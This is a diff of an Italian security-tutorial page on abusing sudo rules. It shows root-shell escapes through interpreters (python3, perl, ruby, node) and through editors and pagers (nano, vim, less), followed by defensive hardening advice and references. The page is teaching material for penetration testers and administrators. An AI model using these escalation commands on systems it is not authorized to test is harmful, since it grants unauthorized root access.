@@ -1,32 +1,30 @@
 # Abuso dei comandi Sudo
 
-{{#include ../../banners/hacktricks-training.md}}
+## Interpreti consentiti da Sudo
 
-## Interpreters consentiti da Sudo
+Se `sudo -l` consente a un utente di eseguire un interprete come root, consideralo un'esecuzione diretta di codice. Gli interpreti sono progettati per eseguire codice arbitrario, quindi una regola che consente `python3`, `perl`, `ruby`, `lua`, `node` o binari simili equivale solitamente all'esecuzione di comandi come root, a meno che gli argomenti non siano rigorosamente limitati e convalidati.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>
 
-Se `sudo -l` consente a un utente di eseguire un interpreter come root, consideralo come esecuzione diretta di codice. Gli interpreters sono progettati per eseguire codice arbitrario, quindi una regola che consente `python3`, `perl`, `ruby`, `lua`, `node` o binari simili equivale solitamente all'esecuzione di comandi come root, a meno che gli argomenti non siano strettamente limitati e convalidati.
-
-Flusso di revisione comune:
+Flusso di revisione comune: prima elenca i privilegi dell'utente, quindi esegui un'istruzione Python con l'opzione `-c` dell'interprete.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
 ```bash
 sudo -l
 sudo /usr/bin/python3 -c 'import os; os.system("id")'
 sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
 ```
-Altri esempi di interpreti:
+Di seguito sono riportati altri esempi di interpreti; gli interpreti elencati documentano l'esecuzione di codice inline o le API dei processi figli.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
 ```bash
 sudo /usr/bin/perl -e 'exec "/bin/sh";'
 sudo /usr/bin/ruby -e 'exec "/bin/sh"'
 sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
 ```
-Il percorso esatto è importante. Se la regola sudo consente `/usr/bin/python3`, utilizza quel percorso esatto durante la convalida:
+Il percorso esatto è importante. Se la regola sudo consente `/usr/bin/python3`, usa quel percorso esatto durante la convalida.<sup>[[2]](#references)</sup>
 ```bash
 sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
 ```
 ## Editor consentiti da Sudo
 
-Se `sudo -l` consente a un utente di eseguire un editor interattivo come root, consideralo una superficie di esecuzione di comandi, non una semplice autorizzazione innocua alla modifica dei file. Gli editor possono spesso eseguire comandi shell, leggere file arbitrari, scrivere file arbitrari o richiamare helper esterni dall'interno dell'editor.
+Se `sudo -l` consente a un utente di eseguire un editor interattivo come root, consideralo una superficie di esecuzione di comandi, non un'innocua autorizzazione alla modifica dei file. Gli editor possono spesso eseguire comandi shell, leggere file arbitrari, scrivere file arbitrari o invocare helper esterni dall'interno dell'editor.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
 
-Flusso di revisione comune:
+Flusso di revisione comune: elenca i privilegi dell'utente, quindi avvia ogni editor o pager consentito tramite sudo.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
 ```bash
 sudo -l
 sudo /usr/bin/nano /etc/hosts
@@ -35,38 +33,55 @@ sudo /usr/bin/less /etc/hosts
 ```
 ### Esecuzione di comandi con Nano
 
-Quando `nano` è consentito tramite sudo, l'esecuzione di comandi potrebbe essere raggiungibile dall'interfaccia dell'editor:
+Quando `nano` è consentito tramite sudo, l'esecuzione di comandi può essere raggiungibile dall'interfaccia dell'editor.<sup>[[12]](#references)</sup>
 ```text
 Ctrl+R
 Ctrl+X
 ```
-Quindi fornisci un comando come:
+Quindi fornisci un comando come `id` o `/bin/sh` al prompt dei comandi di nano.<sup>[[12]](#references)</sup>
 ```bash
 id
 /bin/sh
 ```
-Su alcuni terminali, una shell interattiva potrebbe richiedere il reindirizzamento dei flussi standard:
+Se una shell interattiva non dispone di flussi del terminale utilizzabili, questa forma di redirezione mappa il suo output standard e gli errori sul descrittore 0.<sup>[[15]](#references)</sup>
 ```bash
 reset; /bin/sh 1>&0 2>&0
 ```
-La sequenza esatta dei tasti può variare in base alla versione di nano e alle opzioni di compilazione, ma il problema di sicurezza è lo stesso: l'editor viene eseguito come root e può invocare comandi esterni.
+La sequenza di tasti esatta può variare in base alla versione di nano e alle opzioni di compilazione, ma il problema di sicurezza è lo stesso: l'editor viene eseguito come root e può invocare comandi esterni.<sup>[[1]](#references)[[12]](#references)</sup>
 
-### Altri comuni escape dagli editor
+### Altri comuni escape degli editor
 
-Gli editor in stile Vim espongono comunemente l'esecuzione di comandi tramite `:!`:
+Gli editor in stile Vim espongono comunemente l'esecuzione di comandi tramite `:!`.<sup>[[13]](#references)</sup>
 ```text
 :!/bin/sh
 ```
-Pager come `less` possono anche consentire l'esecuzione di comandi shell:
+I pager come `less` possono anche consentire l'esecuzione di comandi shell.<sup>[[14]](#references)</sup>
 ```text
 !/bin/sh
 ```
 ## Note difensive
 
-- Evitare di concedere interpreti o editor interattivi tramite sudo.
-- Preferire wrapper fissi, di proprietà di root, che eseguano una singola azione amministrativa ben definita.
-- Se un interprete è inevitabile, limitare il percorso esatto dello script e impedire gli argomenti controllati dall’utente, gli import scrivibili, `PYTHONPATH` e la conservazione non sicura dell’ambiente.
-- Se è necessario modificare file, limitare il percorso esatto del file e valutare l’uso di `sudoedit` con versioni di sudo aggiornate e una gestione rigorosa dell’ambiente.
-- Esaminare `SETENV`, `env_keep`, le directory di lavoro scrivibili, i percorsi dei moduli/import scrivibili, `NOEXEC`, `use_pty` e il logging, ma non considerarli una sandbox completa.
+- Evitare di concedere interpreters o editor interattivi tramite sudo.<sup>[[1]](#references)</sup>
+- Preferire wrapper fissi, di proprietà di root, che eseguano una singola azione amministrativa ben definita.<sup>[[1]](#references)[[2]](#references)</sup>
+- Se un interpreter è inevitabile, limitare il percorso esatto dello script e impedire gli argomenti controllati dall'utente, gli import scrivibili, `PYTHONPATH` e la conservazione non sicura dell'ambiente.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+- Se è necessaria la modifica di file, limitare il percorso esatto del file e valutare l'uso di `sudoedit` con versioni aggiornate di sudo e una gestione rigorosa dell'ambiente.<sup>[[1]](#references)[[2]](#references)</sup>
+- Esaminare `SETENV`, `env_keep`, le directory di lavoro scrivibili, i percorsi di moduli/import scrivibili, `NOEXEC`, `use_pty` e il logging, ma non considerarli una sandbox completa.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
 
+## References
+
+- [1] [sudo(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
+- [2] [sudoers(5) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
+- [3] [Riga di comando e ambiente — Documentazione Python](https://docs.python.org/3/using/cmdline.html)
+- [4] [os — Interfacce varie del sistema operativo — Documentazione Python](https://docs.python.org/3/library/os.html)
+- [5] [perlrun — come eseguire l'interpreter Perl](https://perldoc.perl.org/perlrun)
+- [6] [exec — Documentazione Perl](https://perldoc.perl.org/functions/exec)
+- [7] [Opzioni della riga di comando di Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
+- [8] [Kernel — Documentazione Ruby](https://ruby-doc.org/3.4/Kernel.html)
+- [9] [API della riga di comando — Documentazione Node.js](https://nodejs.org/api/cli.html)
+- [10] [Processo figlio — Documentazione Node.js](https://nodejs.org/api/child_process.html)
+- [11] [Pagina del manuale di lua Lua 5.4](https://www.lua.org/manual/5.4/lua.html)
+- [12] [L'editor di testo GNU nano](https://nano-editor.org/manual.html)
+- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
+- [14] [less(1) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man1/less.1.html)
+- [15] [Redirections — Manuale di riferimento Bash](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
 {{#include ../../banners/hacktricks-training.md}}
